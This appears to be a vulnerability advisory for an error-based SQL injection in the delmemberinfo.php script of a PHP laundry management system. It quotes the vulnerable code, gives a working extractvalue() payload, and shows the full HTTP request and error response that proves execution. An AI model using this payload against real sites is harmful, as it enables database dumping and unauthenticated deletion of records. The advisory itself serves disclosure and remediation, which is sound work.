## SIMPLE_LAUNDRY_SYSTEM delmemberinfo.php Error-Based SQL Injection Vulnerability

### I. Vulnerability Impact

The `userid` parameter of `delmemberinfo.php` is concatenated into a `DELETE` statement without validation, and the script echoes the raw MySQL error message back to the client whenever that statement fails. An attacker can therefore place any subquery inside `extractvalue()` and read its result directly from the HTTP response, which allows the database name, the table list and the account hashes held in the `member` and `staff` tables to be dumped one request at a time. Because the same parameter drives a `DELETE` on the `member` table and the script performs no authentication check, an attacker can also delete arbitrary member records.

### II. Source Code Analysis

The vulnerability resides in `delmemberinfo.php`, lines 4-14:

```php
$id = $_GET['userid'];
if (isset($id)) {
    $q="DELETE FROM member where memberId=$id";
    $q = strtolower($q);
    if(!$mysqli->query($q)){
        echo "DELETE failed. Error: ".$mysqli->error ;
   }
   $mysqli->close();
   //redirect
     header("Refresh: 2; url=membermanagement.php");
   echo '<h1 style="text-align: center; font-family: monospace;">DELETE SUCCESS!!</h1>';
 }
```

`$id` is taken straight from `$_GET` and appended to `memberId=` without quotes, so the value is evaluated as a SQL expression instead of a string. There is no `intval()`, no `mysqli_real_escape_string()` and no prepared statement, and because the context is numeric the attacker does not even need a quote to escape a literal — a bare function call is accepted in that position.

Line 9 echoes `$mysqli->error` into the page when the query fails, so any function that raises an error containing the result of an expression — `extractvalue()` or `updatexml()` — turns the endpoint into a direct data extraction channel. Line 7 applies `strtolower()` to the whole statement; this lowercases the injected characters but does not affect SQL semantics or function names, so it has no protective effect.

The file only requires `connect.php` and contains no `session_start()` and no session check, so the statement runs for every request. Line 14 prints `DELETE SUCCESS!!` unconditionally, including when the query failed, which hides the failure from the operator.

### III. Payload

The core injection payload is:

```
extractvalue(1,concat(char(126),md5(1678304194)))
```

The resulting SQL statement executed by the server becomes:

```sql
delete from member where memberid=extractvalue(1,concat(char(126),md5(1678304194)))
```

`extractvalue()` is given a deliberately malformed XPath built from `char(126)` (`~`) concatenated with the value to be extracted. MySQL evaluates the argument, then rejects the XPath and reports it inside the error message, so the evaluated value — here the MD5 of `1678304194` — is returned to the client. No quote is needed because `memberId` is used unquoted in the numeric context.

```
GET /delmemberinfo.php?userid=extractvalue(1,concat(char(126),md5(1678304194))) HTTP/1.1
Host: bbn
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bbn/membermanagement.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=spacqjha3aq8tcnnpfgfdvce3t
Connection: keep-alive
```

The response echoes the evaluated expression inside the MySQL error message, which proves that the injected SQL was executed and that arbitrary query results can be read from the page:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 09:28:57 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Refresh: 2; url=membermanagement.php
Content-Length: 153

DELETE failed. Error: XPATH syntax error: '~f44d5a6362b717874da09f1cad4a228'<h1 style="text-align: center; font-family: monospace;">DELETE SUCCESS!!</h1>
```

### IV. Source Download

https://code-projects.org/simple-laundry-system-in-php-with-source-code/



![image-20261030173013210](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030173013210.png)
